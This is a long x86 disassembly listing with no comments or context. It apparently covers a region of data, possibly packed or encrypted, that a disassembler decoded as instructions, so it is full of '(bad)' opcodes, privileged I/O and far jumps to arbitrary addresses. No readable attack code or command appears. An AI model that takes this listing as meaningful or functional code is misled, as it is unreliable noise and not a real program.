  41305c:	aaa    
  41305d:	add    ch,BYTE PTR [ecx+0x46]
  413060:	je     0x4130ce
  413062:	lods   al,BYTE PTR ds:[esi]
  413063:	rol    BYTE PTR [edi+0x29],cl
  413066:	popa   
  413067:	in     al,0x1a
  413069:	aad    0xd
  41306b:	cmc    
  41306c:	push   ds
  41306d:	xchg   ecx,eax
  41306e:	pop    ds
  41306f:	sub    al,0xac
  413071:	push   cs
  413072:	mov    BYTE PTR [edx],0x69
  413075:	sub    dl,dl
  413077:	sbb    DWORD PTR [eax+0x7b],esi
  41307a:	mov    ebx,DWORD PTR [ebx+0x3a9a103f]
  413080:	fistp  QWORD PTR [edi]
  413082:	cdq    
  413083:	sbb    BYTE PTR [ebp-0x58],ch
  413086:	out    0xaf,al
  413088:	fistp  QWORD PTR [eax]
  41308a:	adc    DWORD PTR [esi],esp
  41308c:	pusha  
  41308d:	adc    bh,0xe6
  413090:	into   
  413091:	mov    cl,BYTE PTR [ebx-0x25]
  413094:	fwait
  413095:	dec    ebx
  413096:	ret    0x375d
  413099:	mov    BYTE PTR [ebp-0x53],dh
  41309c:	push   ss
  41309d:	jg     0x4130cc
  41309f:	(bad)  
  4130a0:	loope  0x41308b
  4130a2:	dec    esp
  4130a3:	dec    esi
  4130a4:	sbb    BYTE PTR [edx+0x7a],bl
  4130a7:	pop    ebp
  4130a8:	inc    esi
  4130a9:	mov    esp,0x41b0816e
  4130ae:	pushf  
  4130af:	inc    eax
  4130b0:	mov    edi,0x93eb0730
  4130b5:	xchg   ebp,eax
  4130b6:	pop    eax
  4130b7:	dec    edx
  4130b8:	add    bl,ch
  4130ba:	push   eax
  4130bb:	fcompp 
  4130bd:	je     0x4130d4
  4130bf:	cmp    al,0xf0
  4130c1:	dec    eax
  4130c2:	pop    ebp
  4130c3:	mov    cl,0x86
  4130c5:	pop    ss
  4130c6:	mov    esi,0x4a57df96
  4130cb:	shl    BYTE PTR [esi-0x11942ad4],0xfd
  4130d2:	ins    BYTE PTR es:[edi],dx
  4130d3:	fsubr  st,st(6)
  4130d5:	mov    ds:0x4830bceb,eax
  4130da:	jns    0x4130ee
  4130dc:	jo     0x41314b
  4130de:	jb     0x4130ae
  4130e0:	dec    esi
  4130e1:	ror    BYTE PTR [esi-0x689064d],1
  4130e7:	ret    
  4130e8:	aaa    
  4130e9:	add    BYTE PTR [esi-0x2a],bh
  4130ec:	mov    ds:0x5b090f74,al
  4130f1:	or     bh,dh
  4130f3:	dec    ecx
  4130f4:	push   DWORD PTR [ecx-0x75f68289]
  4130fa:	jmp    0xed1a:0xa1a0b7a0
  413101:	das    
  413102:	fs loope 0x41313b
  413105:	xchg   esp,eax
  413106:	dec    ebx
  413107:	or     ch,al
  413109:	in     eax,dx
  41310a:	fidivr DWORD PTR [edi-0x4c9b3406]
  413110:	mov    ebx,0xfbc16236
  413115:	daa    
  413116:	hlt    
  413117:	js     0x4130ec
  413119:	ret    
  41311a:	cdq    
  41311b:	xchg   DWORD PTR [esi+0x17],ebx
  41311e:	or     DWORD PTR [edx+0x2d],edi
  413121:	stc    
  413122:	jbe    0x413120
  413124:	idiv   BYTE PTR [edx-0x4c]
  413127:	xchg   BYTE PTR [ebx],al
  413129:	jp     0x413101
  41312b:	dec    ecx
  41312c:	xor    DWORD PTR [ebx+0x4b],0xffffffb0
  413130:	or     bl,0x71
  413133:	push   edi
  413134:	arpl   WORD PTR [edx-0x13],dx
  413137:	pop    DWORD PTR [ebx+0x43e6816e]
  41313d:	jecxz  0x413190
  41313f:	sub    al,0x1
  413141:	cmc    
  413142:	jmp    0x2cff:0xd1db7b02
  413149:	or     esi,ebx
  41314b:	hlt    
  41314c:	push   0x41
  41314e:	push   ss
  41314f:	dec    esp
  413150:	push   ebp
  413151:	add    BYTE PTR [edi+0x4],bl
  413154:	fwait
  413155:	pop    ss
  413156:	add    BYTE PTR [ecx-0x3658004f],0x98
  41315d:	dec    edi
  41315e:	add    al,BYTE PTR [ebx]
  413160:	xlat   BYTE PTR ds:[ebx]
  413161:	pusha  
  413162:	paddd  mm5,QWORD PTR [ebp+0x575c2d90]
  413169:	ins    DWORD PTR es:[edi],dx
  41316a:	loop   0x41317a
  41316c:	out    dx,al
  41316d:	or     al,0xd3
  41316f:	out    0xcd,eax
  413171:	shl    BYTE PTR [edx],0xc
  413174:	mov    edi,0xbb2b83b1
  413179:	mov    esp,0x8a8e2a76
  41317e:	fisttp WORD PTR [ebp-0x12059353]
  413184:	mov    ebp,0xe2a53427
  413189:	mov    cl,BYTE PTR [ebx-0x36ea6934]
  41318f:	rcr    esp,1
  413191:	mov    ebp,?
  413193:	lock test al,0xc5
  413196:	or     eax,0xbc7e6eb1
  41319b:	cld    
  41319c:	jne    0x4131ab
  41319e:	cld    
  41319f:	out    dx,eax
  4131a0:	xor    BYTE PTR ds:0x622ba882,dh
  4131a6:	xor    eax,0x32268c5d
  4131ab:	mov    esi,0xf5a03dd6
  4131b0:	jns    0x4131c8
  4131b2:	ins    BYTE PTR es:[edi],dx
  4131b3:	(bad)  
  4131b4:	xlat   BYTE PTR ds:[ebx]
  4131b5:	loope  0x413206
  4131b7:	pushf  
  4131b8:	sbb    BYTE PTR [esi+0x6389558e],dh
  4131be:	mov    cs,WORD PTR [edx-0xc]
  4131c1:	push   esp
  4131c2:	lods   al,BYTE PTR ds:[esi]
  4131c3:	imul   esi,DWORD PTR fs:[ebp-0x6b],0x4a
  4131c8:	xor    al,0xd6
  4131ca:	loopne 0x413194
  4131cc:	push   ebp
  4131cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131ce:	mov    eax,ds:0xb19e885b
  4131d3:	cmc    
  4131d4:	xlat   BYTE PTR ds:[ebx]
  4131d5:	loop   0x4131c7
  4131d7:	les    edi,FWORD PTR [ecx]
  4131d9:	inc    eax
  4131da:	call   DWORD PTR [edx-0x4e]
  4131dd:	test   ebx,0x6177a98
  4131e3:	imul   ecx,DWORD PTR [ecx+0xa2a050b],0xffffffa3
  4131ea:	mov    ecx,DWORD PTR [esi+0x6e]
  4131ed:	and    cl,ch
  4131ef:	sub    eax,0xbc2be2cc
  4131f4:	jo     0x41317f
  4131f6:	push   edi
  4131f7:	adc    ebx,esi
  4131f9:	pop    ds
  4131fa:	scas   eax,DWORD PTR es:[edi]
  4131fb:	popf   
  4131fc:	jl     0x41324d
  4131fe:	or     esi,ebx
  413200:	lock ja 0x4131da
  413203:	push   edx
  413204:	pop    ebp
  413205:	mov    ebx,0x7b3fd65
  41320a:	or     DWORD PTR [eax+0x5e],ecx
  41320d:	ret    0x2dca
  413210:	and    BYTE PTR [edx+0x39],dl
  413213:	inc    ecx
  413214:	addr16 rcl al,0x15
  413218:	xor    al,0x22
  41321a:	xchg   ebx,eax
  41321b:	popf   
  41321c:	pushf  
  41321d:	cs pop esp
  41321f:	arpl   bx,dx
  413221:	out    dx,eax
  413222:	add    esp,ecx
  413224:	cs out dx,al
  413226:	test   DWORD PTR [eax-0x8],edx
  413229:	sbb    al,0x8f
  41322b:	inc    esp
  41322c:	xlat   BYTE PTR ds:[ebx]
  41322d:	xchg   esi,eax
  41322e:	fcomp  DWORD PTR [edi-0x2f]
  413231:	add    bh,bl
  413233:	int    0xdc
  413235:	pop    ecx
  413236:	push   esi
  413237:	scas   al,BYTE PTR es:[edi]
  413238:	retf   
  413239:	inc    edx
  41323a:	xor    BYTE PTR [edx-0x76b52d8],bl
  413240:	inc    ecx
  413241:	and    al,0x4c
  413243:	fiadd  DWORD PTR [ebx+0x12]
  413246:	stos   DWORD PTR es:[edi],eax
  413247:	cmp    dl,BYTE PTR [esp+ebx*1+0x3]
  41324b:	call   DWORD PTR [edi+0x20cc649d]
  413251:	xchg   edx,eax
  413252:	xchg   esi,eax
  413253:	pop    esi
  413254:	sbb    eax,0x15f9a966
  413259:	test   eax,0x3c0526
  41325e:	mov    bh,0xc5
  413260:	ret    
  413261:	stos   BYTE PTR es:[edi],al
  413262:	xchg   DWORD PTR [edi-0x112af73e],esi
  413268:	push   ebp
  41326a:	add    al,BYTE PTR [eax]
  41326c:	retf   0x1fbe
  41326f:	jmp    0x3dae:0xa88aded1
  413276:	ret    0x33c5
  413279:	mov    esi,0x76dc8755
  41327e:	test   al,0x37
  413280:	or     ch,ch
  413282:	das    
  413283:	dec    edi
  413284:	not    edi
  413286:	clc    
  413287:	push   esi
  413288:	mov    ebp,?
  41328a:	iret   
  41328b:	jo     0x413250
  41328d:	scas   eax,DWORD PTR es:[edi]
  41328e:	mov    al,ds:0x49958102
  413293:	mov    esp,0xd816a938
  413298:	mov    eax,0x424932d7
  41329d:	ins    BYTE PTR es:[edi],dx
  41329e:	stc    
  41329f:	dec    esp
  4132a0:	sub    DWORD PTR ss:[ecx+edi*2+0x6f],ebp
  4132a5:	lahf   
  4132a6:	sbb    bl,BYTE PTR ds:0x9617ab52
  4132ac:	mov    ecx,0xbfe6974c
  4132b1:	inc    edx
  4132b2:	xchg   ecx,eax
  4132b3:	in     eax,dx
  4132b4:	hlt    
  4132b5:	imul   ebp,esp,0xe1d0ca88
  4132bb:	xchg   BYTE PTR [ecx],bl
  4132bd:	or     edi,edx
  4132bf:	aas    
  4132c0:	(bad)  
  4132c1:	stos   DWORD PTR es:[edi],eax
  4132c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132c3:	xchg   esi,eax
  4132c4:	add    DWORD PTR [edi+0x67021a5f],ebp
  4132ca:	add    al,dl
  4132cc:	loop   0x41324e
  4132ce:	mov    edx,0xfe09f02e
  4132d3:	mov    DWORD PTR [edx-0x6],0xe3be63cf
  4132da:	stos   DWORD PTR es:[edi],eax
  4132db:	retf   0x6a03
  4132de:	and    eax,0x609060b8
  4132e3:	and    eax,0x849b4e47
  4132e8:	out    0xc8,eax
  4132ea:	les    ebp,FWORD PTR [esi-0x1c]
  4132ed:	aad    0x20
  4132ef:	adc    edx,eax
  4132f1:	mov    ecx,0xea7bc498
  4132f6:	stos   BYTE PTR es:[edi],al
  4132f7:	(bad)  
  4132f8:	mov    ch,0x6f
  4132fa:	mov    eax,ds:0x66bd3ae2
  4132ff:	mov    DWORD PTR [edi+ebp*8],ecx
  413302:	cmp    al,ch
  413304:	sbb    edi,ebp
  413306:	dec    ebp
  413307:	pop    bp
  413309:	lds    edx,FWORD PTR [edx-0x77]
  41330c:	adc    al,BYTE PTR [edx+eiz*8-0x21]
  413310:	push   edi
  413311:	jae    0x413311
  413313:	call   0xfbd13a83
  413318:	(bad)  
  413319:	das    
  41331a:	add    ecx,DWORD PTR ds:0x419328f2
  413320:	sti    
  413321:	mov    ebp,0x52425d8e
  413326:	inc    eax
  413327:	cmp    BYTE PTR [edx-0x7a5254d3],ah
  41332d:	ds (bad) 
  41332f:	ds sub edx,ebx
  413332:	push   eax
  413333:	lock inc ecx
  413335:	inc    esi
  413336:	cmp    DWORD PTR [esp+eax*1+0x4e],ebp
  41333a:	hlt    
  41333b:	cld    
  41333c:	outs   dx,BYTE PTR ds:[esi]
  41333d:	xchg   BYTE PTR [edi],ah
  41333f:	mov    cs,ecx
  413341:	pmaxsw mm1,mm6
  413344:	lahf   
  413345:	push   esp
  413346:	add    cl,BYTE PTR [ebx]
  413348:	cmp    DWORD PTR [eax],0xffffffab
  41334b:	sbb    al,0x8b
  41334d:	test   eax,0x2d3e5e0f
  413352:	out    0x58,eax
  413354:	pop    es
  413355:	push   ss
  413356:	shl    BYTE PTR [ebx-0x6e],0xc8
  41335a:	xchg   esi,eax
  41335b:	add    bl,BYTE PTR [edx+0x259f1cf9]
  413361:	xchg   esi,eax
  413362:	aad    0xed
  413364:	mov    dl,0x55
  413366:	mov    ch,0xd4
  413368:	add    ebx,DWORD PTR [eax-0x41eb5d40]
  41336e:	outs   dx,DWORD PTR ds:[esi]
  41336f:	cli    
  413370:	mov    ch,0x93
  413372:	call   0xc49a:0xf9790ff8
  413379:	push   ss
  41337a:	and    ebp,DWORD PTR [edx-0x560d02f9]
  413380:	dec    edi
  413381:	push   ds
  413382:	stos   DWORD PTR es:[edi],eax
  413383:	std    
  413384:	fld    DWORD PTR ds:0xad6a771f
  41338a:	inc    ebp
  41338b:	daa    
  41338c:	adc    eax,0xec6c783d
  413391:	sub    eax,0x641bb7ce
  413396:	in     eax,dx
  413397:	test   DWORD PTR [edi+0x32],ebp
  41339a:	out    0x9c,al
  41339c:	and    DWORD PTR [esi],esi
  41339e:	xchg   ebp,eax
  41339f:	mov    ecx,0xe0e3f3de
  4133a4:	sbb    cl,BYTE PTR [esi]
  4133a6:	push   edx
  4133a7:	test   eax,0x584ce40a
  4133ac:	jle    0x4133a5
  4133ae:	and    ch,BYTE PTR [esi+0x33]
  4133b1:	inc    ebp
  4133b2:	ss fdivrp st(2),st
  4133b5:	mov    bh,0xa5
  4133b7:	fisttp WORD PTR [edx]
  4133b9:	js     0x413439
  4133bb:	mov    ds:0xdef95bd,al
  4133c0:	or     ch,dh
  4133c2:	xor    ecx,DWORD PTR [edx+0x2ffa3d6c]
  4133c8:	lods   al,BYTE PTR ds:[esi]
  4133c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ca:	inc    edx
  4133cb:	sub    BYTE PTR [esi],cl
  4133cd:	mov    eax,0x7e4d006e
  4133d2:	add    esi,ebx
  4133d4:	in     al,0xb1
  4133d6:	xchg   ecx,eax
  4133d7:	(bad)
  4133db:	push   esp
  4133dc:	sbb    al,0x30
  4133de:	or     esi,DWORD PTR ds:0x16c96c53
  4133e4:	call   0x5baf1b4b
  4133e9:	cmp    al,0x54
  4133eb:	jmp    0x73eb:0x1b4167f8
  4133f2:	and    al,0xba
  4133f4:	daa    
  4133f5:	lods   al,BYTE PTR ds:[esi]
  4133f6:	xchg   BYTE PTR [ebp-0x45],dh
  4133f9:	xor    DWORD PTR [edi],ecx
  4133fb:	jge    0x4133f6
  4133fd:	nop
  4133fe:	mov    esi,0x3f6d02f7
  413403:	lahf   
  413404:	cmp    eax,0x8a374ee8
  413409:	mov    DWORD PTR [ebx],0xd0b3e630
  41340f:	dec    esi
  413410:	pmuludq mm2,mm3
  413413:	fdiv   QWORD PTR [ecx+0x9fafb45]
  413419:	aam    0xb5
  41341b:	loopne 0x413407
  41341d:	pushf  
  41341e:	leave  
  41341f:	pop    ss
  413420:	pop    es
  413421:	fstp   QWORD PTR [ecx]
  413423:	sub    ah,0x28
  413426:	dec    edi
  413427:	(bad)  
  413428:	sub    BYTE PTR [edx+edx*1+0x455106bc],cl
  41342f:	call   0xe7b0:0xf65844a7
  413436:	bound  edi,QWORD PTR [ecx+0x7b]
  413439:	ins    BYTE PTR es:[edi],dx
  41343a:	sbb    dh,ch
  41343c:	or     DWORD PTR [esp+esi*1-0x17],ebp
  413440:	call   0x93368d5b
  413445:	push   es
  413446:	xlat   BYTE PTR ds:[ebx]
  413447:	dec    esp
  413448:	das    
  413449:	pop    esi
  41344a:	mov    al,0xdb
  41344c:	and    al,BYTE PTR [esi-0x15]
  41344f:	pushf  
  413450:	sub    eax,0x6da2dac9
  413455:	dec    eax
  413456:	sar    DWORD PTR [esi-0x2cc3876f],0x55
  41345d:	jae    0xc5c08841
  413463:	jl     0x4134c6
  413465:	out    dx,eax
  413466:	repnz push ss
  413468:	or     ebx,DWORD PTR [edx+0xfb0a92e]
  41346e:	push   ecx
  41346f:	ret    
  413470:	imul   esp,DWORD PTR [esi-0x102a6290],0xd30504a0
  41347a:	pop    esp
  41347b:	(bad)  
  41347c:	mov    al,0xfc
  41347e:	imul   esi,DWORD PTR [eax+eiz*4-0x6f],0x4f6de80d
  413486:	fsub   st,st(7)
  413488:	rcl    bh,0xd6
  41348b:	sub    bl,BYTE PTR [ebx-0x25]
  41348e:	mov    esi,0xda9c477b
  413493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413494:	nop
  413495:	push   ss
  413496:	arpl   WORD PTR [ecx+0x31a0ee9e],cx
  41349c:	xchg   ebp,eax
  41349d:	icebp  
  41349e:	push   es
  41349f:	push   0x9
  4134a1:	mov    dl,0x59
  4134a3:	sbb    eax,0xb7fd09da
  4134a8:	ja     0x4134ca
  4134aa:	int    0x39
  4134ac:	dec    esp
  4134ad:	mov    edi,0x43e4fa48
  4134b2:	jbe    0x41347c
  4134b4:	xchg   ebp,eax
  4134b5:	sti    
  4134b6:	sbb    ch,bl
  4134b8:	xor    BYTE PTR ds:0xf365f14d,ah
  4134be:	adc    bl,BYTE PTR [ebx-0x3ed62aad]
  4134c4:	aad    0xe4
  4134c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134c7:	dec    esi
  4134c8:	mov    ebx,0x40df5d41
  4134cd:	add    dl,BYTE PTR [edx+0x26]
  4134d0:	stos   BYTE PTR es:[edi],al
  4134d1:	adc    dl,BYTE PTR ds:0x73813c5a
  4134d7:	in     eax,0x92
  4134d9:	shl    bl,cl
  4134db:	pop    ds
  4134dc:	cwde   
  4134dd:	scas   al,BYTE PTR es:[edi]
  4134de:	push   edi
  4134df:	xor    al,0x42
  4134e1:	push   ecx
  4134e2:	sub    ecx,ebp
  4134e4:	std    
  4134e5:	pusha  
  4134e6:	push   ds
  4134e7:	in     eax,0x87
  4134e9:	mov    ah,0xc9
  4134eb:	sub    eax,0xaba3fc73
  4134f0:	in     eax,dx
  4134f1:	push   esi
  4134f2:	mov    edi,0x922989a5
  4134f7:	fnstcw WORD PTR [bp+di-0x2460]
  4134fc:	fmul   st(5),st
  4134fe:	mov    ecx,0x4d0d69b1
  413503:	push   eax
  413504:	mov    bl,0xf1
  413506:	dec    edx
  413507:	jae    0x4134d6
  413509:	jge    0x413511
  41350b:	and    bl,BYTE PTR [esi-0x3f]
  41350e:	push   esp
  41350f:	dec    ecx
  413510:	xchg   edx,eax
  413511:	inc    ebx
  413512:	retf   0xc6d0
  413515:	mov    ebp,0xd8197264
  41351a:	mov    cl,0x6b
  41351c:	push   es
  41351d:	jg     0x413589
  41351f:	mov    eax,0xabd8a619
  413524:	leave  
  413525:	fwait
  413526:	iret   
  413527:	pop    ebx
  413528:	push   esp
  413529:	adc    BYTE PTR [ebx-0x7ef325f4],al
  41352f:	dec    esp
  413530:	adc    al,BYTE PTR [edx-0x2f34b43f]
  413536:	mov    cl,0x1f
  413538:	pop    ebx
  413539:	clc    
  41353a:	ret    0xddd5
  41353d:	add    al,0x6e
  41353f:	inc    ebx
  413540:	mov    al,ds:0xfb1efb51
  413545:	mov    WORD PTR [eax-0x8],es
  413548:	inc    eax
  413549:	inc    ebx
  41354a:	rol    al,cl
  41354c:	mov    eax,ds:0x3a210f01
  413551:	jne    0x41352a
  413553:	test   DWORD PTR [edx+0x2594d8cc],ebp
  413559:	add    BYTE PTR [esi],0x1a
  41355c:	cmp    ecx,ebx
  41355e:	sub    cl,0xe5
  413561:	jmp    0x41359c
  413563:	jmp    0x84c27c07
  413568:	inc    ebx
  413569:	cmp    al,0xfa
  41356b:	cli    
  41356c:	mov    WORD PTR [eax-0x55],gs
  41356f:	das    
  413570:	not    BYTE PTR [ebp-0x60]
  413573:	bound  ebx,QWORD PTR [ebp-0x1a9b563c]
  413579:	or     edx,ebx
  41357b:	adc    bl,BYTE PTR [ebx+0x75abf766]
  413581:	xor    eax,DWORD PTR [eax-0x2]
  413584:	sbb    BYTE PTR [eax+ecx*2+0x6206abbe],ah
  41358b:	mov    bh,BYTE PTR [esi-0xe]
  41358e:	inc    ebx
  41358f:	jmp    0xd7129545
  413594:	arpl   WORD PTR [ecx+ecx*8+0x75],si
  413598:	dec    eax
  413599:	jb     0x41357a
  41359b:	ror    DWORD PTR [ecx],cl
  41359d:	ret    
  41359e:	minps  xmm4,xmm1
  4135a1:	dec    esi
  4135a2:	shr    ebx,cl
  4135a4:	into   
  4135a5:	ins    DWORD PTR es:[edi],dx
  4135a6:	fdivr  QWORD PTR [edx+0x2ae1f55a]
  4135ac:	mov    BYTE PTR [ebp+ecx*2-0x33],0x4b
  4135b1:	adc    ah,BYTE PTR [edx-0x152931ea]
  4135b7:	sbb    BYTE PTR [esi+0x1b101a5e],ah
  4135bd:	dec    edx
  4135be:	push   cs
  4135bf:	outs   dx,DWORD PTR ds:[esi]
  4135c0:	fcomp  QWORD PTR [esi-0x5f8d5cad]
  4135c6:	mov    esi,0x34fff974
  4135cb:	mov    ch,0xb3
  4135cd:	aas    
  4135ce:	inc    esp
  4135cf:	or     DWORD PTR [eax+0x6c166485],ebp
  4135d5:	and    ch,bl
  4135d7:	sub    dh,BYTE PTR [ecx-0x25]
  4135da:	pop    esi
  4135db:	aaa    
  4135dc:	dec    esi
  4135dd:	and    BYTE PTR [edx+0x50],al
  4135e0:	adc    al,dl
  4135e2:	test   eax,0xa933bc30
  4135e7:	sbb    ebx,DWORD PTR [si-0x5675]
  4135ec:	add    DWORD PTR [esi+0x7c7aa0c2],0xbf89c278
  4135f6:	push   0x44
  4135f8:	sahf   
  4135f9:	pop    ebx
  4135fa:	cs pop ebp
  4135fc:	mov    ss,WORD PTR [edi]
  4135fe:	add    edi,eax
  413600:	rol    BYTE PTR [ebx],0xb8
  413603:	or     ebx,eax
  413605:	retf   
  413606:	ins    DWORD PTR es:[edi],dx
  413607:	inc    ebx
  413608:	adc    esp,ecx
  41360a:	push   0xffffffac
  41360c:	shl    DWORD PTR [eax],0x1e
  41360f:	test   DWORD PTR [ebx+0x55],0xd9f09754
  413616:	icebp  
  413617:	xchg   edi,eax
  413618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413619:	aaa    
  41361a:	pop    ds
  41361b:	sbb    DWORD PTR [esp+edi*4+0x563b4a5],edi
  413622:	mov    BYTE PTR [ebx],ah
  413624:	mov    edi,0x908f04e3
  413629:	icebp  
  41362a:	sub    bh,BYTE PTR [edx+edi*4]
  41362d:	clc    
  41362e:	pop    edx
  41362f:	xchg   DWORD PTR [edx-0x5e],edx
  413632:	ror    BYTE PTR [eax+esi*4],1
  413635:	rol    esi,1
  413637:	pop    edx
  413638:	fs cmc 
  41363a:	fwait
  41363b:	in     al,dx
  41363c:	cmp    ebp,edx
  41363e:	mov    ebx,0x1b7d7105
  413643:	arpl   WORD PTR [ecx-0x37],dx
  413646:	stc    
  413647:	mov    esp,ecx
  413649:	sub    eax,eax
  41364b:	sahf   
  41364c:	aam    0x32
  41364e:	mov    cl,0x5e
  413650:	fisttp QWORD PTR [edx+ebx*2+0x31b312cf]
  413657:	mov    al,0xc2
  413659:	adc    bl,BYTE PTR [esi+eiz*8+0x33be03da]
  413660:	or     ch,dl
  413662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413663:	mov    eax,0x74f5a518
  413668:	sub    DWORD PTR [edx],0x32de1aa7
  41366e:	or     esi,DWORD PTR [eax+0x2adc97ac]
  413674:	mov    ebx,0xf3e8c16c
  413679:	inc    esp
  41367a:	lock jl 0x41365d
  41367d:	repnz addr16 pop esi
  413680:	out    dx,eax
  413681:	jbe    0x413628
  413683:	adc    BYTE PTR [edi],cl
  413685:	mov    bh,BYTE PTR ds:0x70d694aa
  41368b:	lahf   
  41368c:	pop    eax
  41368d:	mov    bl,0x85
  41368f:	inc    ecx
  413690:	push   ds
  413691:	mov    ebx,0x33f5d506
  413696:	sbb    al,0x3a
  413698:	sbb    bl,dh
  41369a:	xchg   BYTE PTR [ebx+0x602b4d4b],ch
  4136a0:	jmp    FWORD PTR [edx-0x618eec78]
  4136a6:	jl     0x4136b6
  4136a8:	jo     0x4136ce
  4136aa:	jmp    0x5cdb:0x40f2f8b3
  4136b1:	rcl    BYTE PTR [ecx-0x63],1
  4136b4:	shl    BYTE PTR ds:0x3dcc908d,1
  4136ba:	cmp    eax,0xbf711711
  4136bf:	lock (bad) 
  4136c1:	add    eax,0x9d9c0e3d
  4136c6:	imul   esi,ecx,0xffffff8c
  4136c9:	dec    DWORD PTR [ebx]
  4136cb:	arpl   WORD PTR [ebx+0x32],di
  4136ce:	mov    ch,0x6c
  4136d0:	pop    eax
  4136d1:	test   DWORD PTR [ecx+eiz*4+0x1],edx
  4136d5:	ficom  DWORD PTR [ebp-0x55]
  4136d8:	push   ds
  4136d9:	cs cdq 
  4136db:	pushf  
  4136dc:	mov    al,0x10
  4136de:	or     al,0x5a
  4136e0:	arpl   bx,dx
  4136e2:	call   0x5daf:0x497828c5
  4136e9:	mov    eax,ds:0xc6b237b8
  4136ee:	jno    0x4136e5
  4136f0:	fbld   TBYTE PTR [edi-0x10]
  4136f3:	add    dl,BYTE PTR [edi+edi*8+0x5]
  4136f7:	ret    0xd27f
  4136fa:	cli    
  4136fb:	xchg   ebp,eax
  4136fc:	imul   edi,esp,0x275db9fe
  413702:	lods   eax,DWORD PTR ds:[esi]
  413703:	cmp    ah,0x32
  413706:	mov    ah,0x13
  413708:	mov    BYTE PTR [edx-0xf3ee03a],al
  41370e:	gs inc ebp
  413710:	mov    ah,0x76
  413712:	sbb    edi,esi
  413714:	jp     0x4136b3
  413716:	lock mov dl,0x92
  413719:	retf   
  41371a:	mov    DWORD PTR [edi-0x1f],esp
  41371d:	push   cs
  41371e:	push   0xffffff9b
  413720:	stc    
  413721:	add    edx,esp
  413723:	es fcmovu st,st(7)
  413726:	add    BYTE PTR [ebp+eax*8-0x6cf379c1],al
  41372d:	adc    DWORD PTR [ecx],edx
  41372f:	lahf   
  413730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413731:	fistp  DWORD PTR [edi+esi*4-0x17c2dae9]
  413738:	xchg   BYTE PTR [edx+0x13f37ec6],ah
  41373e:	cmp    DWORD PTR [edi-0x42],esp
  413741:	fs cld 
  413743:	adc    eax,DWORD PTR [esi-0x56b2b421]
  413749:	sub    esp,DWORD PTR [esp+esi*8]
  41374c:	and    eax,0xf22e22c6
  413751:	and    BYTE PTR [ecx-0x23351aa],0xda
  413758:	out    0x6f,eax
  41375a:	dec    ebx
  41375b:	enter  0xf64d,0xb9
  41375f:	dec    ecx
  413760:	inc    edi
  413761:	test   eax,0xeae02cfb
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	adc    eax,0x585cb6d7
  41376c:	fs ss in al,dx
  41376f:	jno    0x413726
  413771:	cli    
  413772:	dec    BYTE PTR [edx]
  413774:	shl    DWORD PTR es:[eax-0x30],cl
  413778:	lock mov ah,0x17
  41377b:	mov    bl,0xa0
  41377d:	shl    BYTE PTR [edx+0x1ddd9235],1
  413783:	jecxz  0x4137c8
  413785:	jmp    0xaeac:0xa93b3c97
  41378c:	shr    ecx,cl
  41378e:	mov    ah,BYTE PTR [edi]
  413790:	hlt    
  413791:	and    eax,0x2f5a1446
  413796:	xchg   ebp,eax
  413797:	xchg   BYTE PTR [ecx+0x142a0df6],dl
  41379d:	xchg   DWORD PTR [esi+ebp*2],edi
  4137a0:	or     BYTE PTR [ebp+0x59],0x8f
  4137a4:	jle    0x41381c
  4137a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137a7:	sbb    DWORD PTR [edx+0x699a9d68],ebp
  4137ad:	lods   al,BYTE PTR ds:[esi]
  4137ae:	xor    edx,DWORD PTR [esp+edi*1-0x4b]
  4137b2:	arpl   WORD PTR [edx+edi*4+0x69],si
  4137b6:	imul   ebx,DWORD PTR [esi],0x4090ed7
  4137bc:	push   edx
  4137bd:	out    dx,al
  4137be:	push   ds
  4137bf:	jmp    0xe1fb78e
  4137c4:	dec    edx
  4137c5:	rol    BYTE PTR [eax+0x4c801256],0xf1
  4137cc:	test   ch,dl
  4137ce:	pop    ecx
  4137cf:	hlt    
  4137d0:	fisttp WORD PTR [eax+ecx*8+0x6c78a4d1]
  4137d7:	daa    
  4137d8:	mov    ecx,0x43c56569
  4137dd:	scas   eax,DWORD PTR es:[edi]
  4137de:	std    
  4137df:	xchg   esp,eax
  4137e0:	push   0x51
  4137e2:	push   esi
  4137e3:	repz push cs
  4137e5:	sub    BYTE PTR [esi],bl
  4137e7:	mov    edi,DWORD PTR [edx+0x48010002]
  4137ed:	dec    eax
  4137ee:	cdq    
  4137ef:	adc    DWORD PTR [ebx-0x51cfd20c],ebp
  4137f5:	or     eax,0x61594e5
  4137fa:	inc    esi
  4137fb:	adc    bl,BYTE PTR [eax]
  4137fd:	repnz mov ebp,0x377eee74
  413803:	mov    ebp,0x3dcf3a09
  413808:	add    DWORD PTR [edx-0x68f23221],0x17
  41380f:	fst    DWORD PTR [edx-0x12f2328a]
  413815:	add    BYTE PTR [ebx],cl
  413817:	xchg   BYTE PTR [ebx],ah
  413819:	add    DWORD PTR [edx+0x74a6ecf7],esi
  41381f:	cmc    
  413820:	dec    ebx
  413821:	mov    WORD PTR [esi-0x3c],ds
  413824:	in     al,dx
  413825:	xor    BYTE PTR [eax+0x37],dh
  413828:	mov    edx,0xd56d8e58
  41382d:	repnz lods eax,DWORD PTR ds:[esi]
  41382f:	arpl   WORD PTR [eax+edx*4-0x4ce47010],bp
  413836:	sub    bh,BYTE PTR [ecx*8-0x1e6795a4]
  41383d:	imul   BYTE PTR [ebx+edx*2-0x35]
  413841:	mov    eax,ds:0xb5f765db
  413846:	popf   
  413847:	sbb    al,0xa7
  413849:	sbb    dh,BYTE PTR [esi+eax*2]
  41384c:	inc    edx
  41384d:	stc    
  41384e:	xchg   edx,eax
  41384f:	and    esp,DWORD PTR [ecx+0x71]
  413852:	mov    WORD PTR ds:0xafcad707,ss
  413858:	cdq    
  413859:	adc    dl,BYTE PTR [ebp+0xa]
  41385c:	cli    
  41385d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41385e:	fnstenv [edx+0x51]
  413861:	pop    edi
  413862:	pop    ss
  413863:	add    eax,0xdd6da6d1
  413868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413869:	push   ss
